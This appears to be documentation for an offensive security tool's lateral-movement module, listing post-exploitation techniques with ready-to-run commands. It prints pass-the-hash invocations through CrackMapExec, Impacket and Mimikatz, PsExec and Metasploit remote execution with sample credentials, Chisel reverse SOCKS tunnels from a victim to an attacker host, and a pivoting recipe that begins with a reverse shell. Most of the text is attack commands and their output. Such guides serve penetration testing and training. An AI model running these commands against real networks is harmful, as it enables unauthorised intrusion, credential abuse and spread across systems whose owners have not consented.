# Lateral Movement Techniques

Post-exploitation techniques for moving through networks.

## Quick Start

```bash
# List all techniques
rb exploit payload lateral

# SSH tunneling
rb exploit payload lateral ssh_tunneling

# Pass-the-Hash
rb exploit payload lateral pass_the_hash
```

## Command

### lateral - Lateral Movement Guide

Display lateral movement techniques and commands.

```bash
rb exploit payload lateral [technique]
```

## Available Techniques

### Linux/Unix

| Technique | Command |
|-----------|---------|
| SSH Key Reuse | `rb exploit payload lateral ssh_key_reuse` |
| SSH Tunneling | `rb exploit payload lateral ssh_tunneling` |
| NFS Mount | `rb exploit payload lateral nfs_mount` |
| Rsync Abuse | `rb exploit payload lateral rsync_abuse` |

### Windows

| Technique | Command |
|-----------|---------|
| PsExec | `rb exploit payload lateral psexec` |
| WMI Execution | `rb exploit payload lateral wmiexec` |
| Pass-the-Hash | `rb exploit payload lateral pass_the_hash` |
| SMB Relay | `rb exploit payload lateral smb_relay` |

### Cross-Platform

| Technique | Command |
|-----------|---------|
| Password Spraying | `rb exploit payload lateral password_spraying` |
| Metasploit Pivot | `rb exploit payload lateral metasploit_pivot` |
| Chisel Tunnel | `rb exploit payload lateral chisel_tunnel` |

## Examples

### List All Techniques

```bash
rb exploit payload lateral
```

### Specific Technique

```bash
# SSH tunneling
rb exploit payload lateral ssh_tunneling

# Pass-the-Hash (Windows)
rb exploit payload lateral pass_the_hash

# PsExec (Windows)
rb exploit payload lateral psexec
```

## Technique Details

### SSH Tunneling

```bash
rb exploit payload lateral ssh_tunneling
```

Output:

```
SSH Tunneling & Port Forwarding

1. Local Port Forwarding:
   ssh -L 8080:internal-server:80 user@jump-host
   # Access internal-server:80 via localhost:8080

2. Remote Port Forwarding:
   ssh -R 8080:localhost:80 user@external-server
   # Expose localhost:80 on external-server:8080

3. Dynamic Port Forwarding (SOCKS Proxy):
   ssh -D 1080 user@jump-host
   # Use localhost:1080 as SOCKS proxy

4. SSH Tunnel through Multiple Hops:
   ssh -J jump1,jump2 user@target

5. Persistent Tunnel (autossh):
   autossh -M 0 -f -N -L 8080:internal:80 user@jump-host
```

### Pass-the-Hash (Windows)

```bash
rb exploit payload lateral pass_the_hash
```

Output:

```
Pass-the-Hash (Windows)

Using CrackMapExec:
  cme smb 192.168.1.0/24 -u Administrator -H aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0

Using Impacket psexec:
  psexec.py -hashes :31d6cfe0d16ae931b73c59d7e0c089c0 Administrator@192.168.1.100

Using Impacket wmiexec:
  wmiexec.py -hashes :31d6cfe0d16ae931b73c59d7e0c089c0 Administrator@192.168.1.100

Using Mimikatz:
  sekurlsa::pth /user:Administrator /domain:. /ntlm:31d6cfe0d16ae931b73c59d7e0c089c0
```

### PsExec (Windows)

```bash
rb exploit payload lateral psexec
```

Output:

```
PsExec Remote Execution (Windows)

Using Sysinternals PsExec:
  psexec.exe \\192.168.1.100 -u Administrator -p Password123 cmd.exe

Using Impacket psexec.py:
  psexec.py Administrator:Password123@192.168.1.100

Using CrackMapExec:
  cme smb 192.168.1.100 -u Administrator -p Password123 -x "whoami"

Using Metasploit:
  use exploit/windows/smb/psexec
  set RHOSTS 192.168.1.100
  set SMBUser Administrator
  set SMBPass Password123
  run
```

### Chisel Tunneling

```bash
rb exploit payload lateral chisel_tunnel
```

Output:

```
Chisel Tunneling

Server (Attacker):
  chisel server -p 8080 --reverse

Client (Victim):
  chisel client 10.10.10.10:8080 R:socks

Forward specific port:
  chisel client 10.10.10.10:8080 R:1080:socks

Multiple forwards:
  chisel client 10.10.10.10:8080 R:3389:localhost:3389 R:socks
```

## Patterns

### Network Pivoting

```bash
# Step 1: Establish foothold
rb exploit payload shell --type python --lhost 10.10.10.10

# Step 2: Set up SOCKS proxy
rb exploit payload lateral ssh_tunneling
# Use: ssh -D 1080 user@compromised-host

# Step 3: Configure tools to use proxy
proxychains nmap -sT 192.168.1.0/24
```

### Active Directory

```bash
# Step 1: Get credentials
rb exploit payload privesc

# Step 2: Pass-the-Hash
rb exploit payload lateral pass_the_hash

# Step 3: Move laterally
psexec.py -hashes :HASH Admin@target
```

## Complementary Tools

| Tool | Purpose |
|------|---------|
| CrackMapExec | Credential spraying |
| Impacket | SMB/WMI tools |
| Metasploit | Pivoting framework |
| BloodHound | AD enumeration |
| Chisel | TCP tunneling |

## Next Steps

- [Persistence](04-persist.md) - Maintain access
- [Privilege Escalation](01-privesc.md) - Escalate privileges
- [Reverse Shells](02-shells.md) - Generate payloads
